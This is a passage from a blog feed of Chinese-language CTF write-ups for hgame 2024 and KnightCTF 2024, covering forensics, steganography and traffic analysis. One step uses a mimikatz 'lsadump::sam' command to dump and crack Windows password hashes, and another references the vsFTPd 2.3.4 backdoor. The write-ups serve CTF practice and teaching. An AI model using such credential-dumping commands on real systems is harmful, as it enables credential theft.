Injection</h3><p>手搓，注意63前面的那一个payload就行<br><code>[https://ctf.mzy0.com/CyberChef3/#recipe=From_Decimal%EF%BC%8810%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%EF%BC%89(&#39;Space&#39;,false)Reverse(&#39;Character&#39;)&amp;input=MTI1IDEwMiA1MCAxMDIgOTcgNTYgNTAgNTcgNTMgOTkgNTYgNTEgMTAwIDQ1IDU0IDk5IDk3IDk4IDQ1IDU2IDU3IDEwMSA1MiA0NSA1MyA1MCA1NSA0OSA0NSA1NSAxMDEgMTAyIDk3IDk4IDk3IDk4IDk5IDEyMyAxMDMgOTcgMTA4IDEwMiA0NCA](https://ctf.mzy0.com/CyberChef3/#recipe=From_Decimal%EF%BC%8810%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%EF%BC%89(&#39;Space&#39;,false)Reverse(&#39;Character&#39;)&amp;input=MTI1IDEwMiA1MCAxMDIgOTcgNTYgNTAgNTcgNTMgOTkgNTYgNTEgMTAwIDQ1IDU0IDk5IDk3IDk4IDQ1IDU2IDU3IDEwMSA1MiA0NSA1MyA1MCA1NSA0OSA0NSA1NSAxMDEgMTAyIDk3IDk4IDk3IDk4IDk5IDEyMyAxMDMgOTcgMTA4IDEwMiA0NCA)</code><br><code>flag&#123;cbabafe7-1725-4e98-bac6-d38c5928af2f&#125;</code></p><h3 id="简单的取证-不过前十个有红包"><a href="#简单的取证-不过前十个有红包" class="headerlink" title="简单的取证,不过前十个有红包"></a>简单的取证,不过前十个有红包</h3><p>在另一个题的vmdk文件<br>7z解压<br>在<code>Documents and Settings\Administrator\桌面</code>找到密钥图片<br><code>968fJD17UBzZG6e3yjF6</code><br>挂载vc得到<code>hgame&#123;happy_new_year_her3_1s_a_redbag_key_41342177&#125;</code></p><h3 id="简单的vmdk取证"><a href="#简单的vmdk取证" class="headerlink" title="简单的vmdk取证"></a>简单的vmdk取证</h3><p>找到sam和system文件<br>保存为<code>sam.hiv</code>和<code>system.hiv</code><br><code>lsadump::sam /sam:sam /system:system</code><br><img src="/mdimg/hgame2024/1707969470009-63c440ad-6afc-496b-8813-6e621c5baa4b.png"><br>解md5为<code>Admin1234</code><br><code>hgame&#123;DAC3A2930FC196001F3AEAB959748448_Admin1234&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>KnightCTF 2024 wp</title>
    <link href="/2024/01/23/KnightCTF%202024/"/>
    <url>/2024/01/23/KnightCTF%202024/</url>
    
    <content type="html"><![CDATA[<h1 id="Digital-Forensics"><a href="#Digital-Forensics" class="headerlink" title="Digital Forensics"></a>Digital Forensics</h1><h3 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h3><p>What is the OS version?           Flag Format: KCTF{1.1.1111.11111}<br><img src="/mdimg/knight2024/1.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">根据提供的信息，<span class="hljs-string">&quot;7601.24214.amd64fre.win7sp1_ldr_&quot;</span> 是 Windows <span class="hljs-number">7</span> Service Pack <span class="hljs-number">1</span> (SP1) 的一个内部版本号。这个版本号中的一些关键部分包括：<br><br><span class="hljs-string">&quot;7601&quot;</span>: 表示 Windows <span class="hljs-number">7</span> 的内部版本号。<br><span class="hljs-string">&quot;24214&quot;</span>: 是此特定版本的内部构建号。<br><span class="hljs-string">&quot;amd64fre&quot;</span>: 表示支持 <span class="hljs-number">64</span> 位体系结构的版本。<br><span class="hljs-string">&quot;win7sp1&quot;</span>: 表示这是 Windows <span class="hljs-number">7</span> Service Pack <span class="hljs-number">1</span> 的版本。<br><span class="hljs-string">&quot;ldr&quot;</span>: 表示此版本是 Service Pack <span class="hljs-number">1</span> 的累积更新 (LDR)<br></code></pre></td></tr></table></figure><p>根据格式<br>KCTF{7.1.7601.24214}</p><h3 id="Password"><a href="#Password" class="headerlink" title="Password"></a>Password</h3><p>What is the login password of the OS?  Please use the attachment of the first challenge.  Flag Format: KCTF{password}<br><img src="/mdimg/knight2024/2.png"><br>KCTF{squad}</p><h3 id="IP-Addr"><a href="#IP-Addr" class="headerlink" title="IP Addr"></a>IP Addr</h3><p>What is the IP address of this system?  Please use the attachment of the first challenge.  Flag Format: KCTF{127.0.0.1}<br>用11的工具<br><a href="https://github.com/Tokeii0/LovelyMem">https://github.com/Tokeii0/LovelyMem</a><br><img src="/mdimg/knight2024/3.png"><br>KCTF{10.0.2.15}</p><h3 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h3><p>My boss has written something in the text file. Could you please help me find it?  Please use the attachment of the first challenge.  Flag Format: KCTF{something_here}<br><img src="/mdimg/knight2024/4.png"><br><a href="https://ctf.mzy0.com/CyberChef3/#recipe=From_Base64%EF%BC%88Base64%E8%BD%AC%E6%8D%A2%EF%BC%89('A-Za-z0-9%2B/%3D',true)&input=UzBOVVJudFNaWE53WldOMFgxa3dkWEpmU0dWeU5HNXJhWDA9IA">https://ctf.mzy0.com/CyberChef3/#recipe=From_Base64%EF%BC%88Base64%E8%BD%AC%E6%8D%A2%EF%BC%89(‘A-Za-z0-9%2B/%3D’,true)&amp;input=UzBOVVJudFNaWE53WldOMFgxa3dkWEpmU0dWeU5HNXJhWDA9IA</a><br><code>KCTF&#123;Respect_Y0ur_Her4nki&#125;</code></p><h3 id="Execution"><a href="#Execution" class="headerlink" title="Execution"></a>Execution</h3><p>My leader, Noman Prodhan, executed something in the cmd of this infected machine. Could you please figure out what he actually executed?  Please use the attachment of the first challenge.  Flag Format: KCTF{Fl4g_h3re}<br><img src="/mdimg/knight2024/5.png"></p><h3 id="Path-of-the-Executable"><a href="#Path-of-the-Executable" class="headerlink" title="Path of the Executable"></a>Path of the Executable</h3><p>What is the path folder of the executable file which execute privious flag?  Please use the attachment of the first challenge.  Flag Format: KCTF{D:\Program Files\Windows\here}<br>根据上题<br><code>KCTF&#123;C:\Users\siam\Documents\ &#125;</code></p><h3 id="Malicious"><a href="#Malicious" class="headerlink" title="Malicious"></a>Malicious</h3><p>What is the malicious software name?  Please use the attachment of the first challenge.  Flag Format: KCTF{SoftWare.ext}<br>找恶意文件<br><img src="/mdimg/knight2024/6.png"><br><img src="/mdimg/knight2024/7.png"></p><h1 id="Steganography"><a href="#Steganography" class="headerlink" title="Steganography"></a>Steganography</h1><h3 id="Oceanic"><a href="#Oceanic" class="headerlink" title="Oceanic"></a>Oceanic</h3><p><img src="/mdimg/knight2024/8.png"><br>base58得到 theoceanisactuallyreallydeeeepp<br>盯帧deepsound<br><img src="/mdimg/knight2024/9.png"><br>foremost分离<br>KCTF{mul71_l4y3r3d_57360_ec4dacb5}</p><h3 id="Flag-Hunt"><a href="#Flag-Hunt" class="headerlink" title="Flag Hunt!"></a>Flag Hunt!</h3><p><img src="/mdimg/knight2024/10.png"><br>rockyou字典爆破<br><code>zippo123</code><br>The flag is here somewhere. Keep Searching..<br>Tip: Use lowercase only<br><img src="/mdimg/knight2024/11.png"><br><code>morsecodetotherescue!!</code><br>发现jpg大部分是一样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-built_in">hash</span>=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>  file = <span class="hljs-string">&#x27;./challenge/img&#x27;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;.jpg&#x27;</span><br>  <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    md5_hash = hashlib.md5(f.read())<br>    hash2=<span class="hljs-built_in">hash</span><br>    <span class="hljs-built_in">hash</span>=md5_hash.hexdigest()<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">hash</span> != hash2):<br>       <span class="hljs-built_in">print</span>(file)<br></code></pre></td></tr></table></figure><p>得到 <code>img725.jpg</code><br><img src="/mdimg/knight2024/12.png"></p><h1 id="Networking"><a href="#Networking" class="headerlink" title="Networking"></a>Networking</h1><p>出的挺不错的流量分析题，环环相扣。难度也适中，挺多题目有引导性，比如第一题，在http流你能看到sqlmap的流量和一堆404状态码的流量，在tcp可以翻到一些Linux命令，和ftp登录流量，根据这些都可以判断受攻击和攻击的ip，这样下来对整个流量就有了一定的了解了。<br>流量本身就比较接近实战的渗透过程，nikto漏扫，sqlmap打sql，cve的运用，getshell后的一些操作。<br>在Confidential 这题找到的zip跟后面的题联动，通过分析app.zip的源码，解出后面的题，有些题目要用到前面做题的分析。<br>总的来说，对刚学流量分析的同学来说可以提升不少。</p><h3 id="Vicker-IP"><a href="#Vicker-IP" class="headerlink" title="Vicker IP"></a>Vicker IP</h3><p>What is the victim &amp; attacker ip?  Flag Format: KCTF{victimIp_attackerIp}<br>过滤出http 能翻出很多sqlmap的流量<br><img src="/mdimg/knight2024/13.png"><br>KCTF{192.168.1.8_192.168.1.7}</p><h3 id="CVE-ID"><a href="#CVE-ID" class="headerlink" title="CVE ID"></a>CVE ID</h3><p>What’s the CVE id for the vulnerable service?  Please use the attachment of the first challenge.  Flag Format: KCTF{CVE-xxxx-xxxx}<br>查看ftp 文件传输协议 端口默认 tcp 21<br><code>tcp.port==21</code><br>可以看到有尝试登录<br><img src="/mdimg/knight2024/14.png"><br><img src="/mdimg/knight2024/15.png"><br><code>vsFTPd 2.3.4</code><br><img src="/mdimg/knight2024/16.png"><br><code>[https://nvd.nist.gov/vuln/detail/CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)</code><br><code>KCTF&#123;CVE-2011-2523&#125;</code></p><h3 id="Basic-Enum"><a href="#Basic-Enum" class="headerlink" title="Basic Enum"></a>Basic Enum</h3><p>What tool did the attacker use to do basic enumeration of the server?  Please use the attachment of the first challenge.  Flag Format: KCTF{toolname}<br>找漏扫工具<br><code>ip.src==192.168.1.7 &amp;&amp; ip.dst==192.168.1.8 &amp;&amp; http </code>过滤出攻击者到受害者的流量<br><img src="/mdimg/knight2024/17.png"><br>搜索<br><img src="/mdimg/knight2024/18.png"><br><code>KCTF&#123;Nikto&#125;</code></p><h3 id="PORT"><a href="#PORT" class="headerlink" title="PORT"></a>PORT</h3><p>根据Famous Tool   知道 为6200<br><img src="/mdimg/knight2024/19.png"><br><code>KCTF&#123;6200&#125;</code></p><h3 id="Hidden-File"><a href="#Hidden-File" class="headerlink" title="Hidden File"></a>Hidden File</h3><p>What’s the flag of the hidden file?  Please use the attachment of the first challenge.  Flag Format: KCTF{fLaG}<br><code>tcp.stream eq 1532</code><br><img src="/mdimg/knight2024/20.png"><br>twin-hex<br><a href="https://www.calcresult.com/misc/cyphers/twin-hex.html">https://www.calcresult.com/misc/cyphers/twin-hex.html</a><br><img src="/mdimg/knight2024/21.png"></p><h3 id="Confidential"><a href="#Confidential" class="headerlink" title="Confidential"></a>Confidential</h3><p>There’s something confidential. Can you find it?  Please use the attachment of the first challenge.  Flag Format: KCTF{fl4G}<br>继续检查<code>tcp.stream eq 1532</code><br><img src="/mdimg/knight2024/22.png"><br>找传输zip的流<br><code>tcp.stream eq 1558</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">https://ctf.mzy0.com/CyberChef3/<span class="hljs-comment">#recipe=From_Hexdump%EF%BC%88%E6%9D%A5%E8%87%AA16%E8%BF%9B%E5%88%B6%E8%BD%AC%E5%AD%98%EF%BC%89()&amp;input=CiAgICAwMDAwMDEyNSAgNTAgNGIgMDMgMDQgMGEgMDAgMDAgMDAgIDAwIDAwIDBiIDBiIDI5IDU4IDAwIDAwICAgUEsuLi4uLi4gLi4uLilYLi4KICAgIDAwMDAwMTM1ICAwMCAwMCAwMCAwMCAwMCAwMCAwMCAwMCAgMDAgMDAgMDQgMDAgMDAgMDAgNjEgNzAgICAuLi4uLi4uLiAuLi4uLi5hcAogICAgMDAwMDAxNDUgIDcwIDJmIDUwIDRiIDAzIDA0IDBhIDAwICAwMCAwMCAwMCAwMCAwZSAwYiAyOSA1OCAgIHAvUEsuLi4uIC4uLi4uLilYCiAgICAwMDAwMDE1NSAgMDAgMDAgMDAgMDAgMDAgMDAgMDAgMDAgIDAwIDAwIDAwIDAwIDBiIDAwIDAwIDAwICAgLi4uLi4uLi4gLi4uLi4uLi4KICAgIDAwMDAwMTY1ICA2MSA3MCA3MCAyZiA2MSA3MyA3MyA2NSAgNzQgNzMgMmYgNTAgNGIgMDMgMDQgMTQgICBhcHAvYXNzZSB0cy9QSy4uLgogICAgMDAwMDAxNzUgIDAwIDAwIDAwIDA4IDAwIDhjIDBlIDJjICA1OCAzZCAxYyAwMyA2MiAxMiAwMiAwMCAgIC4uLi4uLi4sIFg9Li5iLi4uCiAgICAwMDAwMDE4NSAgMDAgNTkgMDYgMDAgMDAgMTQgMDAgMDAgIDAwIDYxIDcwIDcwIDJmIDYxIDczIDczICAgLlkuLi4uLi4gLmFwcC9hc3MKICAgIDAwMDAwMTk1ICA2NSA3NCA3MyAyZiA3MyA3NCA3OSA2YyAgNjUgMmUgNjMgNzMgNzMgYTUgNTQgNWQgICBldHMvc3R5bCBlLmNzcy5UXQogICAgMDAwMDAxQTUgIDZmIGRiIDIwIDE0IDdkIGFmIGQ0IGZmICA3MCBhNSA2YSBlYSAyNiA4NSBjOCA0OSAgIG8uIC59Li4uIHAuai4mLi5JCiAgICAwMDAwMDFCNSAgZWEgMjkgZjEgN2UgYzAgYjQgZTcgN2QgIGJjIDVmIGNjIGI1IDhkIDg2IGMxIDAyICAgLikufi4uLn0gLl8uLi4uLi4KICAgIDAwMDAwMUM1ICBkYyBhNiA4YiBmNiBkZiA4NyA2YiAzYiAgMGUgNjkgOWMgNGEgNWQgMTIgYzkgMGUgICAuLi4uLi5rOyAuaS5KXS4uLgogICAgMDAwMDAxRDUgIDcwIGVlIDNkIDg3IDczIDgwIDFiIGYxICAwYyA4NyBkYiAxYiAwOCA5ZiBjMiA2OCAgIHAuPS5zLi4uIC4uLi4uLi5oCiAgICAwMDAwMDFFNSAgY2YgMGEgYWMgYTUgN2EgY2UgZTAgZmUgIDNiIDk1IDg2IGUwIGU3IGI3IGZiIDA1ICAgLi4uLnouLi4gOy4uLi4uLi4KICAgIDAwMDAwMUY1ICBmYyBjMCBjYSBkNCBiOCA4MCBhZiBhNCAgZTkgMzEgM2MgN2YgOTEgMTUgYTggYzMgICAuLi4uLi4uLiAuMTwuLi4uLgogICAgMDAwMDAyMDUgIDhiIDQzIGVkIDk4IDIzIDJiIDhiIDJmICA3ZCAwOSA4ZSBmOSBlZiBkMiA5YSA1NiAgIC5DLi4jKy4vIH0uLi4uLi5WCiAgICAwMDAwMDIxNSAgMGIgOTYgMWIgNjUgNmMgMDYgNzcgNDUgIGQyIDdkIDg3IGY5IDFhIDZkIDI5IDc1ICAgLi4uZWwud0UgLn0uLi5tKXUKICAgIDAwMDAwMjI1ICAwNiBlMyBmZiAwNiA4NSA5MCBiYSA5YyAgMDYgODQgNzQgOGQgYzIgZDAgYmYgNTAgICAuLi4uLi4uLiAuLnQuLi4uUAogICAgMDAwMDAyMzUgIGI0IDFmIGM2IDJhIDkyIDY1IGU1IDMzICA1OCAyNSBjOSA2MyBmNSAzMiBmNiBmNyAgIC4uLiouZS4zIFglLmMuMi4uCiAgICAwMDAwMDI0NSAgZjYgYTYgN2IgZGMgMzkgMjkgODggYTMgIDFkIDA1IDNjIDQ5IGUxIGFiIDBjIGQ2ICAgLi57LjkpLi4gLi48SS4uLi4KICAgIDAwMDAwMjU1ICA2OSBkMiBlYyBlNyAwOSA2ZCAzNiA5YiAgNjEgZjIgNDggYjEgMjggNjIgM2UgY2MgICBpLi4uLm02LiBhLkguKGI%2BLgogICAgMDAwMDAyNjUgIDliIDI2IGQ0IDk5IGNhIDVjIGEyIGQ1ICBiZCAzMiAyMSAyZCBlNSA1ZSAxYSA5ZCAgIC4mLi4uXC4uIC4yIS0uXi4uCiAgICAwMDAwMDI3NSAgNzUgZDUgZGEgNWEgNDcgZmMgZjIgYjAgIGEzIGE0IDNkIDFjIDI2IDQ0IDkwIDExICAgdS4uWkcuLi4gLi49LiZELi4KICAgIDAwMDAwMjg1ICBmNyAzYSBlOSA3MyA4NCAwZCBiMCA2YSAgM2QgMjIgY2YgYjkgMGYgMmIgOTcgMzUgICAuOi5zLi4uaiA9Ii4uLisuNQogICAgMDAwMDAyOTUgIGU5IDk2IDQ5IDRmIDM1IDFjIGNlIDhhICBhZSAyNiBmMiA5ZSBmNiA5ZSAwOSBjYSAgIC4uSU81Li4uIC4mLi4uLi4uCiAgICAwMDAwMDJBNSAgOGQgYzUgOWUgYTkgMzYgOWEgNjYgYjcgIGMwIGRiIDYwIGFhIGVjIDE3IDllIGVmICAgLi4uLjYuZi4gLi5gLi4uLi4KICAgIDAwMDAwMkI1ICAxZSAyNCBjYiA4ZCAwMyA0MiA0NyA0YyAgNmEgNjYgNWEgN2YgOTkgNGMgNTYgOTkgICAuJC4uLkJHTCBqZlouLkxWLgogICAgMDAwMDAyQzUgIDQ3IDNhIGJhIDcyIGMxIDgyIDM0IDRkICAyMyA2NCA2MSA2YyBjZCAzYSBkNSAyOCAgIEc6LnIuLjRNICNkYWwuOi4oCiAgICAwMDAwMDJENSAgZjUgMDQgYWMgNzEgY2YgMDYgNGIgMWYgIDkyIDQ5IGNlIDk4IDIxIDZjIGJkIDk5ICAgLi4ucS4uSy4gLkkuLiFsLi4KICAgIDAwMDAwMkU1ICA3NyBmOSA5NSBhNyA5MSA5ZiBkYyA1OCAgNDEgOTYgNTkgMTQgYjIgNzUgMTkgNmMgICB3Li4uLi4uWCBBLlkuLnUubAogICAgMDAwMDAyRjUgIDRmIDI2IGY2IGNjIDU1IDI4IGNjIDUzICBjOCAyNCAyNCAyZiAxOCBiMCAyNSBjNyAgIE8mLi5VKC5TIC4kJC8uLiUuCiAgICAwMDAwMDMwNSAgOGYgYzkgMDIgODYgZGYgNzIgZjUgZTkgIDk0IDdkIDQ3IDFlIDBlIGVmIGNhIDA5ICAgLi4uLi5yLi4gLn1HLi4uLi4KICAgIDAwMDAwMzE1ICA0MCA4OSAyMSA2OCBhYiAzNCAwZSA4MCAgNDIgNGUgMmEgM2EgOTUgNGUgZmUgYTEgICBALiFoLjQuLiBCTio6Lk4uLgogICAgMDAwMDAzMjUgIGIwIGVlIGYzIGIwIDZlIDM2IDEwIDUyICAzNyBhZCBiZiA5NiA4NSA1ZSA3OCAxOCAgIC4uLi5uNi5SIDcuLi4uXnguCiAgICAwMDAwMDMzNSAgMGEgYjIgOWMgNTEgNTIgODQgYjQgZTUgIGY5IGU1IDVkIDQ5IDhmIGE4IDRiIDFjICAgLi4uUVIuLi4gLi5dSS4uSy4KICAgIDAwMDAwMzQ1ICA4NiA4ZSBiYyBmNSBkZSBlOCAyYiA1ZSAgNmYgMWUgNzYgNWIgYzEgNjcgZTMgZDYgICAuLi4uLi4rXiBvLnZbLmcuLgogICAgMDAwMDAzNTUgIGY3IDhjIDMyIDM5IGYxIDVlIGNmIDE5ICAzNiA1MSBjYiA1YiBlYiBiYSA5MiA4ZCAgIC4uMjkuXi4uIDZRLlsuLi4uCiAgICAwMDAwMDM2NSAgOTEgZTEgZDAgZDggMmIgODQgZmYgMjMgIGRhIGJkIGM4IDM3IDYzIGJkIGRlIDZkICAgLi4uLisuLiMgLi4uN2MuLm0KICAgIDAwMDAwMzc1ICAxMyBiZSAzYiAwNSA3YSBlNCA4YSBjZSAgYWUgYTcgNzAgOGQgN2QgODggNTUgMDUgICAuLjsuei4uLiAuLnAufS5VLgogICAgMDAwMDAzODUgIGJjIGMyIGM2IDUxIDA2IGUzIDViIDE0ICBmNSBiMyBkYiA2OCAyYyA1ZCAyZCBjMCAgIC4uLlEuLlsuIC4uLmgsXS0uCiAgICAwMDAwMDM5NSAgOGIgZDcgNWUgYTcgZjEgYjkgNDcgMjUgIGNiIDIwIDU3IDUxIGUxIGUzIGE2IGRjICAgLi5eLi4uRyUgLiBXUS4uLi4KICAgIDAwMDAwM0E1ICAwNCA0ZCA3NSA5NCAwNCAyMSA0NCBkYyAgZTEgYmQgYjYgODYgMDIgZmYgMDAgNTAgICAuTXUuLiFELiAuLi4uLi4uUAogICAgMDAwMDAzQjUgIDRiIDAzIDA0IDBhIDAwIDAwIDAwIDAwICAwMCBhMyBiNSAyYyA1OCAwMCAwMCAwMCAgIEsuLi4uLi4uIC4uLixYLi4uCiAgICAwMDAwMDNDNSAgMDAgMDAgMDAgMDAgMDAgMDAgMDAgMDAgIDAwIDEwIDAwIDAwIDAwIDYxIDcwIDcwICAgLi4uLi4uLi4gLi4uLi5hcHAKICAgIDAwMDAwM0Q1ICAyZiA2MyA2ZiA2ZSA3NCA3MiA2ZiA2YyAgNmMgNjUgNzIgNzMgMmYgNTAgNGIgMDMgICAvY29udHJvbCBsZXJzL1BLLgogICAgMDAwMDAzRTUgIDA0IDE0IDAwIDAwIDAwIDA4IDAwIGNkICBiNSAyYyA1OCBkMCA2ZSBkOCAxOSA2ZCAgIC4uLi4uLi4uIC4sWC5uLi5tCiAgICAwMDAwMDNGNSAgMDAgMDAgMDAgNzggMDAgMDAgMDAgMWMgIDAwIDAwIDAwIDYxIDcwIDcwIDJmIDYzICAgLi4ueC4uLi4gLi4uYXBwL2MKICAgIDAwMDAwNDA1ICA2ZiA2ZSA3NCA3MiA2ZiA2YyA2YyA2NSAgNzIgNzMgMmYgNjkgNzMgNWYgNmMgNmYgICBvbnRyb2xsZSBycy9pc19sbwogICAgMDAwMDA0MTUgIDY3IDY5IDZlIDJlIDcwIDY4IDcwIGIzICBiMSAyZiBjOCAyOCA1MCBlMCBlNSAyYSAgIGdpbi5waHAuIC4vLihQLi4qCiAgICAwMDAwMDQyNSAgNGUgMmQgMmUgY2UgY2MgY2YgOGIgMmYgIDJlIDQ5IDJjIDJhIGQxIGQwIGI0IGU2ICAgTi0uLi4uLi8gLkksKi4uLi4KICAgIDAwMDAwNDM1ICBlNSBlMiBlNSBjYSA0YyBkMyA1MCBjYyAgMmMgMmUgNGUgMmQgZDEgNTAgODkgMGYgICAuLi4uTC5QLiAsLk4tLlAuLgogICAgMDAwMDA0NDUgIDc2IDBkIDBlIGY2IGY0IGY3IDhiIDU2ICBjZiBjOSA0ZiBjZiBjYyA1MyA4ZiBkNSAgIHYuLi4uLi5WIC4uTy4uUy4uCiAgICAwMDAwMDQ1NSAgZDQgYWMgZTYgZTUgNTIgMDAgODIgOGMgIGQ0IGM0IDk0IGQ0IDIyIDBkIDc1IDlmICAgLi4uLlIuLi4gLi4uLiIudS4KICAgIDAwMDAwNDY1ICBmYyBlNCBjNCAxMiBhMCAwOSA1NiAwYSAgN2EgN2EgZmEgOTkgNzkgMjkgYTkgMTUgICAuLi4uLi5WLiB6ei4ueSkuLgogICAgMDAwMDA0NzUgIDdhIDQwIDkzIGQ1IDM1IGFkIDIxIGNhICA1MiAyYiAzMiAyMSBjNiBkNiA4MiA0YyAgIHpALi41LiEuIFIrMiEuLi5MCiAgICAwMDAwMDQ4NSAgYjYgYjcgMDMgMDAgNTAgNGIgMDMgMDQgIDE0IDAwIDAwIDAwIDA4IDAwIGZjIDBjICAgLi4uLlBLLi4gLi4uLi4uLi4KICAgIDAwMDAwNDk1ICAyYyA1OCBjZCBkZiA4YiBlMSBiMiAwMSAgMDAgMDAgYTAgMDMgMDAgMDAgMjQgMDAgICAsWC4uLi4uLiAuLi4uLi4kLgogICAgMDAwMDA0QTUgIDAwIDAwIDYxIDcwIDcwIDJmIDYzIDZmICA2ZSA3NCA3MiA2ZiA2YyA2YyA2NSA3MiAgIC4uYXBwL2NvIG50cm9sbGVyCiAgICAwMDAwMDRCNSAgNzMgMmYgNzAgNzIgNmYgNjMgNjUgNzMgIDczIDVmIDYxIDY0IDY0IDVmIDc0IDYxICAgcy9wcm9jZXMgc19hZGRfdGEKICAgIDAwMDAwNEM1ICA3MyA2YiAyZSA3MCA2OCA3MCA5NSA1MyAgY2IgNGUgZWIgMzAgMTAgZGQgNDcgY2EgICBzay5waHAuUyAuTi4wLi5HLgogICAgMDAwMDA0RDUgIDNmIDhjIGEyIDhhIDNhIDUyIDk1IDg4ICBlNSBhNSAzYyA4NCA0NCAxNyA0OCA1NSAgID8uLi46Ui4uIC4uPC5ELkhVCiAgICAwMDAwMDRFNSAgNDEgYTQgNjUgODMgNTAgZTIgYzYgNTMgIDYyIGUxIDNhIGM1IDBmIDUwIDc1IGM1ICAgQS5lLlAuLlMgYi46Li5QdS4KICAgIDAwMDAwNEY1ICBiZiA2MyAyNyBhNSA0ZCA1YiA1OCAzMCAgMWIgM2YgZTYgY2MgOTkgMzMgZTMgZjEgICAuYycuTVtYMCAuPy4uLjMuLgogICAgMDAwMDA1MDUgIGY5IGQ1IGFhIDVhIDg1IDgxIDQ2IGFkICA3OSAyZCA3MyA2ZCBhOCAzMiAyNCAxZSAgIC4uLlouLkYuIHktc20uMiQuCiAgICAwMDAwMDUxNSAgODYgNDEgM2QgZWYgMWMgYjggMmMgODUgIDY1IDQ4IGEyIDI0IDQ5IDk3IDM1IDQzICAgLkE9Li4uLC4gZUguJEkuNUMKICAgIDAwMDAwNTI1ICBhMSA1MyAzNiA0ZiA1YyA2NCBlNCBiZCAgY2UgYmYgMDAgYzIgYjUgNDYgNDMgN2EgICAuUzZPXGQuLiAuLi4uLkZDegogICAgMDAwMDA1MzUgIGY5IGZkIDVkIDM2IDdkIGVhIDUzIGM2ICA3MiA0MyBmNSA2YiAzZSAzNyBiMiBmZiAgIC4uXTZ9LlMuIHJDLms%2BNy4uCiAgICAwMDAwMDU0NSAgMWMgYzcgZjAgM2YgMGMgYzAgZDkgMzEgIGQyIGEzIDZlIDUwIDk3IDhhIGFmIDBjICAgLi4uPy4uLjEgLi5uUC4uLi4KICAgIDAwMDAwNTU1ICBhZiAzZCAxOCA0ZSA0ZSBlMCAxOCA5MyAgMTkgNmEgYWMgZWUgNzIgNzkgZWIgMWQgICAuPS5OTi4uLiAuai4ucnkuLgogICAgMDAwMDA1NjUgIDg0IGMzIDA1IDJjIGQ3IGZhIDRkIGYwICA1YyAyMSAxNSBiOSA3MyBkMCAxNSBiYSAgIC4uLiwuLk0uIFwhLi5zLi4uCiAgICAwMDAwMDU3NSAgNGEgMTQgOTcgMmYgYTQgNTcgZDYgNTIgIDBlIGUwIGY3IGNjIGMzIDAzIGUyIDM2ICAgSi4uLy5XLlIgLi4uLi4uLjYKICAgIDAwMDAwNTg1ICBlNyA1ZiAzOSBkYiBhOCAwMyAzYSA2YiAgMzkgNzMgNDQgOGEgNGEgNDYgNGUgMWIgICAuXzkuLi46ayA5c0QuSkZOLgogICAgMDAwMDA1OTUgIDFiIGMwIGJmIGM2IDNjIDZjIDA3IDRjICA1MyBjMCBiMiBhYSAyMSAzYSBhYSBlYyAgIC4uLi48bC5MIFMuLi4hOi4uCiAgICAwMDAwMDVBNSAgN2MgYWUgMmUgYmIgYjIgYTIgYmQgYjggIDllIDEzIGU4IGY4IGEzIGRiIDQ5IDM2ICAgfC4uLi4uLi4gLi4uLi4uSTYKICAgIDAwMDAwNUI1ICA3YSA5OCBjMiBlZCA2NCA3YSAwNyA4NSAgMDcgZWIgMDIgNDggYzEgNTkgMzEgODAgICB6Li4uZHouLiAuLi5ILlkxLgogICAgMDAwMDA1QzUgIGMyIGRhIDc2IDZkIDFlIDg2IDM5IGVhICBlZCA0MSAzNyA4YyA0NSAwYyA4ZiBkNyAgIC4udm0uLjkuIC5BNy5FLi4uCiAgICAwMDAwMDVENSAgZTMgZDkgMjggMDMgMzIgOTkgOGQgYzcgIDAzIGU4IDM3IGIyIGZiIDdlIDczIGEwICAgLi4oLjIuLi4gLi43Li5%2Bcy4KICAgIDAwMDAwNUU1ICA2NiA3YiBiNyAyOSAzNiA4ZSBiYSBjNSAgMmEgZDQgNTYgOTggNWQgZGYgZGUgMmMgICBmey4pNi4uLiAqLlYuXS4uLAogICAgMDAwMDA1RjUgIGFhIGY1IGI2IDU1IGVlIGFhIGRiIDlhICBkZCBjZSAwZiBjNyAyNiA3NiBlZiA5MSAgIC4uLlUuLi4uIC4uLi4mdi4uCiAgICAwMDAwMDYwNSAgYmQgYjUgNGQgOTkgYmEgOGMgNzAgY2QgIDE4IDMyIGM4IDZjIDU5IGJhIGE5IDVkICAgLi5NLi4ucC4gLjIubFkuLl0KICAgIDAwMDAwNjE1ICA1OCAyMSBkNiAwOSAzYyAyMCBlMyAwYSAgNGIgZTMgOWUgMjQgNDkgOTIgYWUgMTggICBYIS4uPCAuLiBLLi4kSS4uLgogICAgMDAwMDA2MjUgIDZmIDE1IDUyIDg2IDhhIDQ0IDBhIDE3ICA4ZSBiZSAzYSAzYiAxZCA4MiA1NSBlMiAgIG8uUi4uRC4uIC4uOjsuLlUuCiAgICAwMDAwMDYzNSAgYzIgNGQgZjMgM2IgYzcgMGYgOWQgMzYgIDdkIGRhIGNlIGYzIDc3IGQ0IGE3IDliICAg